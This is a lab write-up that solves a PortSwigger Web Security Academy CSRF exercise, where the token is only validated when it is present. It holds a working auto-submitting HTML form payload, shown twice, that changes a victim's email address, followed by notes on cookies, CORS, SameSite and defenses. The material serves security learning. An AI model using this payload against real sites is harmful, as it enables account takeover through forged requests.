# CSRF where token validation depends on token being present

*A concise write‑up using my original steps (verbatim flow) with small, accurate notes. Authorized lab use only.*

---

## 🎯 Goal
**Change another user’s email address even though the endpoint advertises a CSRF token.**

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** change other users email, protected by csrf token.  
2. Log in with the provided creds and intercept the change‑email request: **`/my-account/change-email`**.  
3. **Remove the `csrf` token parameter** → the request is **still valid** (no enforcement).  
4. Build an **auto‑submitting form** to deliver to the victim:
   ```html
   <form id="ex" action="https://0a8100ea048286fc806403ce00ee00b6.web-security-academy.net/my-account/change-email" method="POST">
     <input name="email" value="email@gmail.com">
   </form>

   <script>document.getElementById("ex").submit()</script>
   ```
5. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)
- The application includes a `csrf` parameter but **doesn’t actually validate** it. When the victim loads your page, the browser **sends their cookies** with the cross‑site form POST, authenticating the change.
- **CORS** isn’t involved: CSRF uses **HTML forms**, which the browser submits cross‑site without needing CORS; we don’t need to read the response, only trigger it.
- **SameSite** considerations: in many labs cookies are `SameSite=None; Secure` (or unset), so cross‑site POSTs include cookies. Hardened apps should use **tokens + Origin/Referer checks** and appropriate `SameSite` values.

---

## 🧾 Raw exploit (kept exactly)
```html
<form id="ex" action="https://0a8100ea048286fc806403ce00ee00b6.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" value="email@gmail.com">
</form>

<script>document.getElementById("ex").submit()</script>
```

---

## 🏁 Result
- Even with a token parameter present, **no validation** allowed a standard CSRF auto‑submit attack to change the victim’s email. **Solved. ✅**
